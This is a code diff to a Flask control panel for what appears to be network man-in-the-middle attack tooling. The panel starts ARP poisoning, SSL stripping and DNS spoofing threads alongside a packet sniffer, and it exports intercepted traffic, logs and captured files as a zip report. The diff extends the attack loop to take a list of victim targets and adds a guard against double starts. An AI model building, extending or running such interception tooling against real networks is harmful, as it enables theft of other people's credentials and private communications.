@@ -5,11 +5,12 @@ from core.arp import run_attack_loop
 from core.ssl_strip import run_ssl_strip
 from core.dns import start_dns_spoofing 
 from core.sniffer import start_sniffer
-from core.scanner import scan_network  
+from core.scanner import scan_network   
 import csv
 import io
 import zipfile 
-import os      
+import os
+from core.utils import log_msg, activate_silence_timer       
 
 def create_app():
     app = Flask(__name__)
@@ -31,22 +32,39 @@ def create_app():
             return jsonify({"status": "cleared"})
         if act == 'stop':
             STOP_EVENT.set()
+            activate_silence_timer()
+            
             return jsonify({"status": "stopped"})
 
         if 'start' in act:
+            # --- [FIX] PREVENT DOUBLE START ---
+            # If an attack is already running, reject the new request.
+            if threads['attack'] and threads['attack'].is_alive():
+                 return jsonify({"status": "already_running", "message": "Attack is already active."})
+            # ----------------------------------
+
             STOP_EVENT.clear()
-            STATUS["target"] = req.get('target')
+            
+            # --- UPDATED INPUT HANDLING ---
+            # 1. Try to get list of targets
+            target_list = req.get('targets', [])
+            
+            # 2. Backward compatibility: if single target sent, make it a list
+            if not target_list and req.get('target'):
+                target_list = [req.get('target')]
+                
+            STATUS["targets"] = target_list
             STATUS["gateway"] = req.get('gateway')
             STATUS["interface"] = req.get('interface')
             STATUS["dns_domain"] = req.get('dns_domain')
             STATUS["dns_ip"] = req.get('dns_ip')
+            # ------------------------------
         
-            # This allows the frontend to know which tab to highlight on refresh
             if act == 'start_dns': STATUS["active_tab"] = 'dns'
             elif act == 'start_sslstrip': STATUS["active_tab"] = 'ssl'
             elif act == 'start_silent': STATUS["active_tab"] = 'silent'
             
-            # Start Sniffer (Common to all)
+            # Start Sniffer
             if not threads['sniffer'] or not threads['sniffer'].is_alive():
                 threads['sniffer'] = threading.Thread(target=start_sniffer, daemon=True)
                 threads['sniffer'].start()
@@ -57,22 +75,20 @@ def create_app():
             if act == 'start_silent':
                 STATUS["mode"] = "SILENT"
                 passive_mode = True 
-                # Silent Mode: We START ARP loop (passive=True) but NO other attacks.
-
             elif act == 'start_dns':
                 STATUS["mode"] = "DNS SPOOF"
                 threads['dns'] = threading.Thread(target=start_dns_spoofing, daemon=True)
                 threads['dns'].start()
-
             elif act == 'start_sslstrip':
                 STATUS["mode"] = "SSL STRIP"
                 threads['ssl'] = threading.Thread(target=run_ssl_strip, daemon=True)
                 threads['ssl'].start()
 
-            # Start ARP Loop (Active or Passive based on flag)
+            # Start ARP Loop with TARGET LIST
             threads['attack'] = threading.Thread(
                 target=run_attack_loop, 
-                args=(STATUS["target"], STATUS["gateway"], passive_mode), 
+                # PASS THE LIST HERE 
+                args=(STATUS["targets"], STATUS["gateway"], passive_mode), 
                 daemon=True
             )
             threads['attack'].start()
@@ -94,7 +110,6 @@ def create_app():
     def scan_route():
         interface = request.json.get('interface', 'eth0')
         try:
-            # Run the scan
             active_hosts = scan_network(interface)
             return jsonify({"status": "success", "hosts": active_hosts})
         except Exception as e:
@@ -106,12 +121,11 @@ def create_app():
         
         with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
             
-            # GENERATE CSV FROM PERSISTENT HISTORY
+            # CSV Generation
             si = io.StringIO()
             cw = csv.writer(si)
             cw.writerow(['Timestamp', 'Source IP', 'Destination', 'Type', 'Content Snippet', 'Full Packet ID'])
             
-            # USE "all_intercepted_data" HERE
             for item in STATUS["all_intercepted_data"]:
                 cw.writerow([
                     item.get('time', ''),
@@ -123,12 +137,11 @@ def create_app():
                 ])
             zf.writestr('intercept_report.csv', si.getvalue())
             
-            # GENERATE LOGS FROM PERSISTENT HISTORY 
-            # USE "all_logs" HERE
+            # Logs Generation
             logs_content = "\n".join(STATUS["all_logs"])
             zf.writestr('console_logs.txt', logs_content)
             
-            # INCLUDE CAPTURED FILES
+            # Capture Files
             if os.path.exists(CAPTURE_DIR):
                 for root, dirs, files in os.walk(CAPTURE_DIR):
                     for file in files:
